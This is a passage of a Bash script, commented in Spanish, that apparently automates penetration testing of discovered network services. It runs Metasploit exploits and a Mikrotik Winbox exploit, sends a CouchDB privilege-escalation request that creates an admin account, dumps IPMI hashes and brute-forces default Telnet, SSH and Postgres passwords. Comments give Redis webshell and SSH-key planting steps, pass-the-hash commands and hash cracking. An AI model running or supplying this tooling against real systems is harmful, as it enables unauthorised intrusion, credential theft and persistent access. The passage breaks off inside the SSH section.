	# psexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

	# wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
	# wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

	# smbexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
	# smbexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

	# atexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP> <COMMAND>
	# atexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
	
fi

if [ -f servicios/smb.txt ]
then  
	echo -e "$OKBLUE #################### SMB (`wc -l servicios/smb.txt`) ######################$RESET"	
	for ip in $(cat servicios/smb_uniq.txt); do		
	
		$proxychains getArch.py -target $ip > logs/enumeracion/"$ip"_445_arch.txt
		grep --color=never "is" logs/enumeracion/"$ip"_445_arch.txt > .enumeracion/"$ip"_445_arch.txt
															
		grep --color=never "|" logs/vulnerabilidades/"$ip"_445_ms08067.txt| egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|NOT_FOUND" > .vulnerabilidades/"$ip"_445_ms08067.txt 					
		grep --color=never "|" logs/vulnerabilidades/"$ip"_445_ms17010.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|NOT_FOUND" > .vulnerabilidades/"$ip"_445_ms17010.txt  			
		grep --color=never "|" logs/vulnerabilidades/"$ip"_445_doublepulsar.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|NOT_FOUND" > .vulnerabilidades/"$ip"_445_doublepulsar.txt  			
		grep --color=never "|" logs/vulnerabilidades/"$ip"_445_conficker.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|NOT_FOUND" > .vulnerabilidades/"$ip"_445_conficker.txt 
		grep --color=never "|" logs/vulnerabilidades/"$ip"_445_ms10061.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|NOT_FOUND" > .vulnerabilidades/"$ip"_445_ms10061.txt 
		grep --color=never "|" logs/vulnerabilidades/"$ip"_445_ms07029.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|NOT_FOUND" > .vulnerabilidades/"$ip"_445_ms07029.txt 
		grep --color=never "|" logs/vulnerabilidades/"$ip"_445_ms06025.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|NOT_FOUND" > .vulnerabilidades/"$ip"_445_ms06025.txt 
		grep --color=never "|" logs/vulnerabilidades/"$ip"_445_sambacry.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|NOT_FOUND" > .vulnerabilidades/"$ip"_445_sambacry.txt 
		grep --color=never "|" logs/vulnerabilidades/"$ip"_445_ms09050.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|NOT_FOUND" > .vulnerabilidades/"$ip"_445_ms09050.txt
		grep ":" logs/vulnerabilidades/"$ip"_445_nullsession.txt 2>/dev/null | egrep -iv "Enter WORKGROUP|password for|Unknown parameter" > .vulnerabilidades/"$ip"_445_nullsession.txt 
		         
		grep --color=never "not required" logs/vulnerabilidades/"$ip"_445_smb2Security.txt > .vulnerabilidades/"$ip"_445_smb2Security.txt
		egrep --color=never "READ|WRITE" logs/vulnerabilidades/"$ip"_445_compartidoSMB.txt | sort | uniq | grep -v '\$' > .vulnerabilidades/"$ip"_445_compartidoSMB.txt		
		egrep --color=never "Disk" logs/vulnerabilidades/"$ip"_445_compartidoSMBClient.txt | sort | uniq | grep -v '\$' > .vulnerabilidades/"$ip"_445_compartidoSMBClient.txt		


		writable_shared=`egrep --color=never "WRITE" logs/vulnerabilidades/"$ip"_445_compartidoSMB.txt | cut -d " " -f1-2 | head -1|tr -d '\t'` 

		if [ ! -z "$writable_shared" ]; then
			echo "Probando samba_symlink_traversal con ($writable_shared)"
			$proxychains msfconsole -x "use admin/smb/samba_symlink_traversal;set SMBSHARE '$writable_shared';set RHOSTS $ip;exploit;exit" > logs/vulnerabilidades/"$ip"_445_symlinkTraversal.txt 2>/dev/null
			grep "rootfs" logs/vulnerabilidades/"$ip"_445_symlinkTraversal.txt | egrep -v "exploits|payloads|evasion|cowsay" | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g"  > .vulnerabilidades/"$ip"_445_symlinkTraversal.txt
			#######################		
		fi		

		
		#smbclient --list //10.11.1.146/
		################################										
	done				
	
	#insert clean data	
	insert_data
fi



#####################################




if [ -f servicios/pptp.txt ]
then
	echo -e "$OKBLUE #################### pptp (`wc -l servicios/pptp.txt`) ######################$RESET"
	for line in $(cat servicios/pptp.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`		
		echo -e "[+] Escaneando $ip"
		touch pass.txt
		echo "thc-pptp-bruter -u 'hn_csm' -n 4 $ip < pass.txt"  > logs/enumeracion/"$ip"_pptp_hostname.txt 2>/dev/null 
		thc-pptp-bruter -u 'hn_csm' -n 4 $ip < pass.txt  >> logs/enumeracion/"$ip"_pptp_hostname.txt 2>/dev/null 
		grep "Hostname" logs/enumeracion/"$ip"_pptp_hostname.txt > .enumeracion/"$ip"_pptp_hostname.txt
		rm pass.txt
	done
	
	#insert clean data	
	insert_data	
fi


if [ -f servicios/IPMI.txt ]
then
	echo -e "$OKBLUE #################### IPMI (`wc -l servicios/IPMI.txt`) ######################$RESET"
	for line in $(cat servicios/IPMI.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`		
		echo -e "[+] Escaneando $ip"
		$proxychains msfconsole -x "use auxiliary/scanner/ipmi/ipmi_version;set RHOSTS $ip;exploit;exit" > logs/enumeracion/"$ip"_"$port"_IPMIVersion.txt 2>/dev/null							   
		grep "[+]" logs/enumeracion/"$ip"_"$port"_IPMIVersion.txt | grep "IPMI" | egrep -v "exploits|payloads|evasion|cowsay" | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g"  > .enumeracion/"$ip"_"$port"_IPMIVersion.txt

		egrep -iq "+" .enumeracion/"$ip"_"$port"_IPMIVersion.txt
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then						
			echo -e "\t$OKRED[!] IPMI activo $RESET"			
			echo -e "\t[+] Probando usuario anonimo"		
			echo "ipmitool -I lanplus -H $ip -U '' -P '' user list" >> logs/vulnerabilidades/"$ip"_"$port"_anonymousIPMI.txt 2>/dev/null 
			$proxychains ipmitool -I lanplus -H $ip -U '' -P '' user list >> logs/vulnerabilidades/"$ip"_"$port"_anonymousIPMI.txt 2>/dev/null 
			grep -i "ADMIN" logs/vulnerabilidades/"$ip"_"$port"_anonymousIPMI.txt > .vulnerabilidades/"$ip"_"$port"_anonymousIPMI.txt 	
			
			echo -e "\t[+] Probando vulnerabilidad cipher-zero"
			echo "$proxychains  nmap -sU --script ipmi-cipher-zero -p 623 -Pn -n $ip"  > logs/vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt 2>/dev/null 
			$proxychains  nmap -sU --script ipmi-cipher-zero -p $port -Pn -n $ip >> logs/vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt 2>/dev/null 
			grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE" > .vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt 	
			
			#exploit
			#ipmitool -I lanplus -C 0 -H 192.168.200.5 -U admin -P root user list 
			#ipmitool -I lanplus -C 0 -H 192.168.200.5 -U admin -P root user set password 1 123456 
			
			echo -e "\t[+] Probando si se puede extraer hashes"
			#$proxychains msfconsole -x "use auxiliary/scanner/ipmi/ipmi_dumphashes;set RHOSTS $ip;set CRACK_COMMON false;run;exit" > logs/vulnerabilidades/"$ip"_"$port"_hashesIPMI.txt 2>/dev/null							   
			$proxychains ipmipwner.py --host $ip -oH logs/vulnerabilidades/"$ip"_"$port"_hashesIPMI.txt 2>/dev/null	
			grep -i rakp logs/vulnerabilidades/"$ip"_"$port"_hashesIPMI.txt > .vulnerabilidades/"$ip"_"$port"_hashesIPMI.txt
			#./hashcat.bin "dddd:aaaaa" /media/sistemas/Passwords/Passwords/rockyou2021.txt
		fi		
	done
	
	#insert clean data	
	insert_data	
fi

if [ -f servicios/mongoDB.txt ]
then
	echo -e "$OKBLUE #################### MongoDB (`wc -l servicios/mongoDB.txt`) ######################$RESET"

	for line in $(cat servicios/mongoDB.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`		
		echo -e "[+] Escaneando $ip:$port"
		echo "$proxychains nmap -n -sT -p $port -Pn --script=mongodb-databases,mongodb-info $ip"  > logs/vulnerabilidades/"$ip"_mongo_info.txt 2>/dev/null 
		$proxychains nmap -n -sT -p $port -Pn --script=mongodb-databases $ip  >> logs/vulnerabilidades/"$ip"_mongo_info.txt 2>/dev/null 

		egrep -iq "requires authentication" logs/vulnerabilidades/"$ip"_mongo_info.txt 
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then						
			echo -e "\t Auth requerida"			
		else
			grep --color=never "|" logs/vulnerabilidades/"$ip"_mongo_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE" > .vulnerabilidades/"$ip"_mongo_info.txt 				
		fi				
		
		
		
	done	
	#insert clean data	
	insert_data	
fi


if [ -f servicios/couchDB.txt ]
then
	echo -e "$OKBLUE #################### couchDB (`wc -l servicios/couchDB.txt`)  ######################$RESET"

	for line in $(cat servicios/couchDB.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`		
		echo -e "[+] Escaneando $ip:$port"
		echo "$proxychains nmap -Pn -n -sT -p $port --script=couchdb-databases,couchdb-stats $ip" >> logs/vulnerabilidades/"$ip"_mongo_info.txt 2>/dev/null
		$proxychains nmap -Pn -n -sT -p $port --script=couchdb-databases $ip >> logs/vulnerabilidades/"$ip"_mongo_info.txt 2>/dev/null
		grep --color=never "|" logs/vulnerabilidades/"$ip"_mongo_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE" > .vulnerabilidades/"$ip"_mongo_info.txt

		#CVE-2017-12635
		$proxychains curl -X PUT -d '{"type":"user","name":"hacker","roles":["_admin"],"roles":[],"password":"hacker"}' $ip:$port/_users/org.couchdb.user:hacker -H "Content-Type:application/json" > logs/vulnerabilidades/"$ip"_"$port"_privEsc.txt

	done
	
	#insert clean data	
	insert_data	
fi

######################################

#falta
if [ -f servicios/x11.txt ]
then
	echo -e "$OKBLUE #################### X11 (`wc -l servicios/x11.txt`)  ######################$RESET"	  
	for line in $(cat servicios/x11.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`		
		echo -e "[+] Escaneando $ip:$port"		
		echo "$proxychains nmap -Pn -sT -n $ip --script=x11-access.nse" > logs/vulnerabilidades/"$ip"_"$port"_x11Access.txt 2>/dev/null 
		$proxychains nmap -Pn -sT -n $ip --script=x11-access.nse >> logs/vulnerabilidades/"$ip"_"$port"_x11Access.txt 2>/dev/null 
		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_x11Access.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE" > .vulnerabilidades/"$ip"_"$port"_x11Access.txt 

		#xdpyinfo -display <ip>:<display>
		#xwininfo -root -tree -display <IP>:<display> #Ex: xwininfo -root -tree -display 10.5.5.12:0

		#use exploit/unix/x11/x11_keyboard_exec
	done	
	
	#insert clean data	
	insert_data
fi

if [ -f servicios/rpc.txt ]
then
	echo -e "$OKBLUE #################### RPC (`wc -l servicios/rpc.txt`)  ######################$RESET"	  	

	for line in $(cat servicios/rpc.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`	
		echo -e "[+] Escaneando $ip:$port"		
		echo "$proxychains nmap -Pn -n -sT -p $port $ip --script=nfs-ls.nse" > logs/vulnerabilidades/"$ip"_"$port"_compartidoNFS.txt 2>/dev/null 
		$proxychains nmap -Pn -n -sT -p $port $ip --script=nfs-ls.nse >> logs/vulnerabilidades/"$ip"_"$port"_compartidoNFS.txt 2>/dev/null 
		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_compartidoNFS.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE" > .vulnerabilidades/"$ip"_"$port"_compartidoNFS.txt 
		
		echo "$proxychains nmap -n -sT -p $port $ip --script=rpcinfo" > logs/enumeracion/"$ip"_"$port"_NFSinfo.txt 2>/dev/null 
		$proxychains nmap -Pn -n -sT -p $port $ip --script=rpcinfo >> logs/enumeracion/"$ip"_"$port"_NFSinfo.txt 2>/dev/null 
		grep --color=never "|" logs/enumeracion/"$ip"_"$port"_NFSinfo.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE" > .enumeracion/"$ip"_"$port"_NFSinfo.txt

		$proxychains rusers -l $ip > logs/enumeracion/"$ip"_"$port"_rusers.txt 2>/dev/null
		egrep "console|tty" logs/enumeracion/"$ip"_"$port"_rusers.txt > .enumeracion/"$ip"_"$port"_rusers.txt

		$proxychains showmount $ip > logs/enumeracion/"$ip"_"$port"_showmount.txt 2>/dev/null
		cat logs/enumeracion/"$ip"_"$port"_showmount.txt > .enumeracion/"$ip"_"$port"_showmount.txt 
		
	done	
	# mount -t nfs 10.11.1.72:/home /mnt/compartido
	# mount -o nolock 10.11.1.72:/home /mnt/compartido
	# mount -t nfs [-o vers=2] 10.12.0.150:/backup /mnt/new_back -o nolock
	insert_data	
fi

if [ -f servicios/msrpc.txt ]
then
	echo -e "$OKBLUE #################### MSRPC (`wc -l servicios/msrpc.txt`)  ######################$RESET"	  
	for line in $(cat servicios/msrpc.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`	
		echo -e "[+] Escaneando $ip:$port"		
		echo "$proxychains  nmap -Pn -n -sT -p $port --script=msrpc-enum $ip" > logs/enumeracion/"$ip"_"$port"_msrpc.txt 2>/dev/null 
		$proxychains nmap -Pn -n -p $port --script=msrpc-enum $ip>> logs/enumeracion/"$ip"_"$port"_msrpc.txt 2>/dev/null 
		grep --color=never "|" logs/enumeracion/"$ip"_"$port"_msrpc.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE" > .enumeracion/"$ip"_"$port"_msrpc.txt 
		
	done	
	insert_data	
fi






if [ -f servicios/winbox.txt ]
then	
	echo -e "$OKBLUE #################### winbox (`wc -l servicios/winbox.txt`) ######################$RESET"	    
	for line in $(cat servicios/winbox.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`	
		echo -e "[+] Escaneando $ip:$port"					
		$proxychains WinboxExploit.py $ip > logs/vulnerabilidades/"$ip"_8291_winboxVuln.txt 2>/dev/null
		
		egrep -iq "Exploit successful" logs/vulnerabilidades/"$ip"_8291_winboxVuln.txt
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then						
			echo -e "\t$OKRED[!] Mikrotik vulnerable $RESET"
			cat logs/vulnerabilidades/"$ip"_8291_winboxVuln.txt | egrep -v "Connected|successful" > .vulnerabilidades/"$ip"_8291_winboxVuln.txt 								
		fi				
		
	done
	
	#insert clean data	
	insert_data	
fi





if [ -f servicios/redis.txt ]
then	
	echo -e "$OKBLUE #################### Redis (`wc -l servicios/redis.txt`) ######################$RESET"	    
	for line in $(cat servicios/redis.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`	
		echo -e "[+] Escaneando $ip:$port"			
		echo "$proxychains  nmap -n -sT -p $port $ip --script redis-info" > logs/enumeracion/"$ip"_redis_info.txt 2>/dev/null
		$proxychains nmap -Pn -n -p $port $ip --script redis-info >> logs/enumeracion/"$ip"_redis_info.txt 2>/dev/null
		grep --color=never "|" logs/enumeracion/"$ip"_redis_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE"  > .enumeracion/"$ip"_redis_info.txt						
		#A exploit for Redis(<=5.0.5) RCE redis-exploit.sh

		echo "redis-cli -h $ip config get '*'" > logs/enumeracion/"$ip"_redis_config.txt 2>/dev/null
		$proxychains redis-cli -h $ip config get '*' >> logs/enumeracion/"$ip"_redis_config.txt 2>/dev/null
		cat logs/enumeracion/"$ip"_redis_config.txt > .enumeracion/"$ip"_redis_config.txt

		echo "$proxychains msfconsole -x use auxiliary/scanner/redis/redis_server;set RHOSTS $ip;exploit;exit" > logs/enumeracion/"$ip"_redis_endpoints.txt 2>/dev/null
		$proxychains msfconsole -x "use auxiliary/scanner/redis/redis_server;set RHOSTS $ip;exploit;exit" >> logs/enumeracion/"$ip"_redis_endpoints.txt 2>/dev/null
		grep '\[+\]' logs/enumeracion/"$ip"_redis_endpoints.txt > .enumeracion/"$ip"_redis_endpoints.txt

		#Webshell
		# redis-cli -h 10.85.0.52
		# config set dir /usr/share/nginx/html
		# config set dbfilename redis.php
		# set test "<?php phpinfo(); ?>"
		# save

		#SSH
		#(echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt
		#cat spaced_key.txt | redis-cli -h 10.85.0.52 -x set ssh_key
		# redis-cli -h 10.85.0.52
		# config set dir /var/lib/redis/.ssh
		# config set dbfilename "authorized_keys"
		# save


	done
	
	#insert clean data	
	insert_data	
fi

if [ -f servicios/rmi.txt ]
then	
	echo -e "$OKBLUE #################### RMI (`wc -l servicios/rmi.txt`) ######################$RESET"	    
	for line in $(cat servicios/rmi.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "[+] Escaneando $ip:$port"

		echo -e "[+] Nmap vulnerabilities"
		echo "$proxychains  nmap -Pn -n -p $port --script rmi-vuln-classloader $ip" > logs/vulnerabilidades/"$ip"_"$port"_rmiVuln.txt 2>/dev/null
		$proxychains nmap -Pn -n -p $port --script rmi-vuln-classloader $ip>> logs/vulnerabilidades/"$ip"_"$port"_rmiVuln.txt 2>/dev/null
		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_rmiVuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE" > .vulnerabilidades/"$ip"_"$port"_rmiVuln.txt

		echo -e "[+] rmg vulnerabilities"
		$proxychains rmg.sh enum $ip $port > logs/vulnerabilidades/"$ip"_"$port"_rmiVuln2.txt
		grep "+" logs/vulnerabilidades/"$ip"_"$port"_rmiVuln2.txt > .vulnerabilidades/"$ip"_"$port"_rmiVuln2.txt

		echo -e "[+] rmg guess"
		$proxychains rmg.sh guess $ip $port > logs/vulnerabilidades/"$ip"_"$port"_rmiGuess.txt
		grep "+" logs/vulnerabilidades/"$ip"_"$port"_rmiGuess.txt > .vulnerabilidades/"$ip"_"$port"_rmiGuess.txt
		

		
	done
	
	#insert clean data	
	insert_data
fi



## Telnet
if [ -f servicios/telnet.txt ]
then
	
	cat servicios/telnet.txt  | cut -d ":" -f1 > servicios/telnet_onlyhost.txt 

	echo -e "\t[+] Obteniendo banner"	
	interlace -tL servicios/telnet_onlyhost.txt -threads 5 -c "echo -e '\tquit' | $proxychains nc -w 4 _target_ 23 | strings > .banners/_target__23.txt 2>/dev/null" --silent
	
	echo "$proxychains  nmap -n -sT -p $port --script=telnet-ntlm-info.nse $ip" > logs/enumeracion/"$ip"_"$port"_telnetInfo.txt 2>/dev/null
	$proxychains nmap -Pn -n -sT -p $port --script=telnet-ntlm-info.nse $ip >> logs/enumeracion/"$ip"_"$port"_telnetInfo.txt 2>/dev/null
	grep --color=never "|" logs/enumeracion/"$ip"_"$port"_telnetInfo.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE" >> .enumeracion/"$ip"_"$port"_telnetInfo.txt
	
	
	echo -e "\t[+] Probando passwords"	
	interlace -tL servicios/telnet_onlyhost.txt -threads 5 -c "echo -e '\n medusa -h _target_ -u admin -p admin -M telnet' >> logs/vulnerabilidades/_target__23_passwordDefecto.txt 2>/dev/null" --silent
	interlace -tL servicios/telnet_onlyhost.txt -threads 5 -c "$proxychains medusa -h _target_ -u admin -p admin -M telnet >> logs/vulnerabilidades/_target__23_passwordDefecto.txt 2>/dev/null" --silent

	interlace -tL servicios/telnet_onlyhost.txt -threads 5 -c "echo -e '\n medusa -h _target_ -u admin -e n -M telnet' >> logs/vulnerabilidades/_target__23_passwordDefecto.txt 2>/dev/null" --silent
	interlace -tL servicios/telnet_onlyhost.txt -threads 5 -c "$proxychains medusa -h _target_ -u admin -e n -M telnet >> logs/vulnerabilidades/_target__23_passwordDefecto.txt 2>/dev/null" --silent
	
	interlace -tL servicios/telnet_onlyhost.txt -threads 5 -c "echo -e '\n medusa -h _target_ -u root -p root -M telnet'>> logs/vulnerabilidades/'_target_'_23_passwordDefecto.txt 2>/dev/null" --silent
	interlace -tL servicios/telnet_onlyhost.txt -threads 5 -c "$proxychains medusa -h _target_ -u root -p root -M telnet >> logs/vulnerabilidades/'_target_'_23_passwordDefecto.txt 2>/dev/null" --silent
	
	interlace -tL servicios/telnet_onlyhost.txt -threads 5 -c "echo -e '\n medusa -h _target_ -u root -p solokey -M telnet'>> logs/vulnerabilidades/'_target_'_23_passwordDefecto.txt 2>/dev/null" --silent
	interlace -tL servicios/telnet_onlyhost.txt -threads 5 -c "$proxychains medusa -h _target_ -u root -p solokey -M telnet >> logs/vulnerabilidades/'_target_'_23_passwordDefecto.txt 2>/dev/null" --silent
	
	interlace -tL servicios/telnet_onlyhost.txt -threads 5 -c "echo -e '\n medusa -h _target_ -u root -e n -M telnet' >> logs/vulnerabilidades/'_target_'_23_passwordDefecto.txt 2>/dev/null" --silent
	interlace -tL servicios/telnet_onlyhost.txt -threads 5 -c "$proxychains medusa -h _target_ -u root -e n -M telnet >> logs/vulnerabilidades/'_target_'_23_passwordDefecto.txt 2>/dev/null" --silent
			
	
fi

if [ -f servicios/postgres.txt ]
then
		
	echo -e "\t[+] Probando passwords"	
	cat servicios/postgres.txt  | cut -d ":" -f1 > servicios/postgres_onlyhost.txt 
	interlace -tL servicios/postgres_onlyhost.txt  -threads 5 -c "echo -e '\n medusa -h _target_ -u postgres -p postgres -M postgres' >> logs/vulnerabilidades/_target__5432_passwordBD.txt 2>/dev/null" --silent
	interlace -tL servicios/postgres_onlyhost.txt  -threads 5 -c "$proxychains medusa -h _target_ -u postgres -p postgres -M postgres >> logs/vulnerabilidades/_target__5432_passwordBD.txt 2>/dev/null" --silent
	
	interlace -tL servicios/postgres_onlyhost.txt -threads 5 -c "echo -e '\n medusa -h _target_ -u postgres -e n -M postgres' >> logs/vulnerabilidades/_target__5432_passwordBD.txt 2>/dev/null" --silent
	interlace -tL servicios/postgres_onlyhost.txt -threads 5 -c "$proxychains medusa -h _target_ -u postgres -e n -M postgres >> logs/vulnerabilidades/_target__5432_passwordBD.txt 2>/dev/null" --silent

	interlace -tL servicios/postgres_onlyhost.txt  -threads 5 -c "echo -e '\n medusa -h _target_ -u pgsql -p pgsql -M postgres' >> logs/vulnerabilidades/_target__5432_passwordBD.txt 2>/dev/null" --silent
	interlace -tL servicios/postgres_onlyhost.txt  -threads 5 -c "$proxychains medusa -h _target_ -u pgsql -p pgsql -M postgres >> logs/vulnerabilidades/_target__5432_passwordBD.txt 2>/dev/null" --silent
	
fi


if [ -f servicios/rsync.txt ]
then
	echo -e "$OKBLUE #################### rsync (`wc -l servicios/rsync.txt`)######################$RESET"	    
	while read line; do		
		ip=`echo $line | cut -f1 -d ":"`		
		port=`echo $line | cut -f2 -d ":"`
		$proxychains rsync -av --list-only rsync://$ip:$port > logs/enumeracion/"$ip"_"$port"_rsyncList.txt 2>/dev/null
		cat logs/enumeracion/"$ip"_"$port"_rsyncList.txt > .enumeracion/"$ip"_"$port"_rsyncList.txt				

	 	$proxychains nmap -n -Pn -p $port --script rsync-list-modules $ip > logs/enumeracion/"$ip"_"$port"_rsync.txt 2>/dev/null
		grep '|' logs/enumeracion/"$ip"_"$port"_rsync.txt > .enumeracion/"$ip"_"$port"_rsync.txt

		#rsync -av rsync://10.10.10.200/conf_backups files
		#encfs2john files/ > encfs6.xml.john2
		#john --wordlist=/usr/share/wordlists/rockyou.txt --progress-every=3 --pot=s3cwalk.pot encfs6.xml.john
		#encfsctl export files decrypt
		 
 	done <servicios/rsync.txt
		
	#insert clean data	
	insert_data
fi # postgres


if [ -f servicios/postgres.txt ]
then
	echo -e "$OKBLUE #################### POSTGRES (`wc -l servicios/postgres.txt`)######################$RESET"	    
	while read line; do		
		ip=`echo $line | cut -f1 -d":"`		
		port=`echo $line | cut -f2 -d":"`
	 	 grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_5432_passwordBD.tx > .vulnerabilidades/"$ip"_5432_passwordBD.tx 2>/dev/null
		 echo ""
 	done <servicios/postgres.txt
		
	#insert clean data	
	insert_data
fi # postgres



if [ -f servicios/telnet.txt ]
then
	echo -e "$OKBLUE #################### TELNET (`wc -l servicios/telnet.txt`)######################$RESET"	    
	while read line; do		
		ip=`echo $line | cut -f1 -d":"`		
		port=`echo $line | cut -f2 -d":"`
	 	 grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt > .vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
		 echo ""
 	done <servicios/telnet.txt
		
	#insert clean data	
	insert_data
fi # telnet


if [ -f servicios/ssh.txt ]
then
    echo -e "$OKBLUE #################### SSH (`wc -l servicios/ssh.txt`)######################$RESET"	    
	echo -e "\t[+] Obtener banner"
	cat servicios/ssh.txt | cut -d ":" -f1 > servicios/ssh_onlyhost.txt 
	interlace -tL servicios/ssh_onlyhost.txt -threads 5 -c "echo -e '\tquit' |$proxychains nc -w 4 _target_ 22 | strings | uniq> .banners/_target__22.txt 2>/dev/null	" --silent
	
	echo -e "\t[+] Probando vulnerabilidad CVE-2018-15473"				
	#usuario root123445 no existe, si sale "is a valid user" el target no es vulnerable
	interlace -tL servicios/ssh_onlyhost.txt -threads 5 -c "echo $proxychains enumeracionUsuariosSSH.py -u root123445 --port 22 _target_ >> logs/vulnerabilidades/'_target_'_22_CVE-2018-15473.txt" --silent
	interlace -tL servicios/ssh_onlyhost.txt -threads 5 -c "$proxychains enumeracionUsuariosSSH.py -u root123445 --port 22 _target_ >> logs/vulnerabilidades/'_target_'_22_CVE-2018-15473.txt" --silent

	echo -e "\t[+] Probando passwords"	
	interlace -tL servicios/ssh_onlyhost.txt -threads 5 -c "echo -e '\n medusa -h _target_ -u admin -p admin -M ssh' >> logs/vulnerabilidades/'_target_'_22_passwordDefecto.txt 2>/dev/null" --silent
	interlace -tL servicios/ssh_onlyhost.txt -threads 5 -c "$proxychains medusa -h _target_ -u admin -p admin -M ssh >> logs/vulnerabilidades/'_target_'_22_passwordDefecto.txt 2>/dev/null" --silent
	
	interlace -tL servicios/ssh_onlyhost.txt -threads 5 -c "echo -e '\n medusa -h _target_ -u admin -e n -M ssh' >> logs/vulnerabilidades/'_target_'_22_passwordDefecto.txt 2>/dev/null" --silent
	interlace -tL servicios/ssh_onlyhost.txt -threads 5 -c "$proxychains medusa -h _target_ -u admin -e n -M ssh >> logs/vulnerabilidades/'_target_'_22_passwordDefecto.txt 2>/dev/null" --silent
	
	interlace -tL servicios/ssh_onlyhost.txt -threads 5 -c "echo -e '\n medusa -h _target_ -u root -p root -M ssh' >> logs/vulnerabilidades/'_target_'_22_passwordDefecto.txt 2>/dev/null" --silent
	interlace -tL servicios/ssh_onlyhost.txt -threads 5 -c "$proxychains medusa -h _target_ -u root -p root -M ssh >> logs/vulnerabilidades/'_target_'_22_passwordDefecto.txt 2>/dev/null" --silent
	
	interlace -tL servicios/ssh_onlyhost.txt -threads 5 -c "echo -e '\n medusa -h _target_ -u root -e n -M ssh' >> logs/vulnerabilidades/'_target_'_22_passwordDefecto.txt 2>/dev/null" --silent
	interlace -tL servicios/ssh_onlyhost.txt -threads 5 -c "$proxychains medusa -h _target_ -u root -e n -M ssh >> logs/vulnerabilidades/'_target_'_22_passwordDefecto.txt 2>/dev/null" --silent					


	
	while read line; do
		ip=`echo $line | cut -f1 -d":"`		
		port=`echo $line | cut -f2 -d":"`
		
		#enumeracionUsuariosSSH2.py -U $common_user_list  $ip > logs/vulnerabilidades/"$ip"_"$port"_enumeracionUsuariosSSH2.txt &

		#SSHBypass
		
		#grep --color=never "libssh" 
		egrep -iq "libssh" .banners/"$ip"_22.txt | egrep -v "dropbear" 2>/dev/null
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t[+] Probando vulnerabilidad libSSH bypass"	
